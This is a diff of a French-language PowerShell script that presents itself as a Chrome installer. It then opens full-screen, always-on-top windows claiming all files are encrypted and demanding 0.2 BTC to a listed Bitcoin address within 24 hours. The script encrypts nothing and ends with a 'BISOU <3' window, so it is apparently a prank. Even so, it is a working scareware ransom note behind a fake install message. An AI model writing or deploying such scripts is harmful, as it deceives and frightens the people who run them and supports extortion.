@@ -1,64 +1,33 @@
 Add-Type -AssemblyName PresentationFramework
 
-# Premier pop-up
-[System.Windows.MessageBox]::Show('Installation en cours de Chrome...', 'Information', 'OK', 'Information')
+# Premier pop-up classique
+[System.Windows.MessageBox]::Show('Installation de Chrome... TERMINE', 'Information', 'OK', 'Information')
 
-# Deuxième pop-up combiné
-[System.Windows.MessageBox]::Show(
-    'Envoie-moi 0.2 BTC pour obtenir la clé de déchiffrement.\n\n' +
-    'Mon adresse BTC : 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A\n\n' +
-    'Vous avez 24 heures pour envoyer le paiement ou vos fichiers seront définitivement perdus.',
-    'Avertissement critique',
-    'OK', 
-    'Warning'
-)
+# Deuxième fenêtre WPF pour avertissement critique
+$warningWindow = New-Object Windows.Window
+$warningWindow.Title = 'AVERTISSEMENT CRITIQUE'
+$warningWindow.Content = "TOUS VOS FICHIERS SONT CHIFFRES !`n`n" +
+                         "Envoie-moi 0.2 BTC pour obtenir la cle de dechiffrement.`n`n" +
+                         "Mon adresse BTC : 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A.`n`n" +
+                         "DELAI RESTANT : 24 HEURES SOUS PEINE DE PERDRE VOS FICHIERS DEFINITIVEMENT"
+$warningWindow.FontSize = 32
+$warningWindow.Width = 700
+$warningWindow.Height = 400
+$warningWindow.WindowStartupLocation = 'CenterScreen'
+$warningWindow.Topmost = $true
+$warningWindow.Background = 'Red'
+$warningWindow.Foreground = 'White'
+$warningWindow.ShowDialog()
 
-# Grande fenêtre WPF pour "TOUS VOS FICHIERS SONT CHIFFRÉS"
-Add-Type -TypeDefinition @"
-using System.Windows;
-using System.Windows.Controls;
-public class WarningWindow {
-    public static void ShowWindow(string title, string message, string bgColor, string fgColor, int width, int height, int fontSize) {
-        Window window = new Window {
-            Title = title,
-            Width = width,
-            Height = height,
-            WindowStartupLocation = WindowStartupLocation.CenterScreen,
-            Topmost = true,
-            Background = (System.Windows.Media.Brush)new System.Windows.Media.BrushConverter().ConvertFromString(bgColor),
-            Foreground = (System.Windows.Media.Brush)new System.Windows.Media.BrushConverter().ConvertFromString(fgColor),
-            Content = new TextBlock {
-                Text = message,
-                FontSize = fontSize,
-                TextWrapping = TextWrapping.Wrap,
-                HorizontalAlignment = HorizontalAlignment.Center,
-                VerticalAlignment = VerticalAlignment.Center,
-                TextAlignment = TextAlignment.Center
-            }
-        };
-        window.ShowDialog();
-    }
-}
-"@ -Language CSharp
-
-# Fenêtre 1 : Alerte "TOUS VOS FICHIERS SONT CHIFFRÉS !"
-[WarningWindow]::ShowWindow(
-    "ALERTE SECURITE", 
-    "TOUS VOS FICHIERS SONT CHIFFRÉS !\n\nPayez pour les récupérer immédiatement !", 
-    "Red", 
-    "White", 
-    800, 
-    400, 
-    48
-)
-
-# Fenêtre 2 : Alerte avec "DÉLAI RESTANT"
-[WarningWindow]::ShowWindow(
-    "DÉLAI RESTANT : 24 HEURES", 
-    "PAYEZ MAINTENANT OU PERDEZ VOS DONNÉES À JAMAIS !\n\nAdresse BTC : 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A", 
-    "Black", 
-    "Red", 
-    900, 
-    500, 
-    42
-)
+# Grande fenêtre WPF pour "TOUS VOS FICHIERS SONT CHIFFRES"
+$window = New-Object Windows.Window
+$window.Title = 'ALERTE SECURITE'
+$window.Content = 'BISOU <3'
+$window.FontSize = 48
+$window.Width = 800
+$window.Height = 400
+$window.WindowStartupLocation = 'CenterScreen'
+$window.Topmost = $true
+$window.Background = 'Red'
+$window.Foreground = 'White'
+$window.ShowDialog()
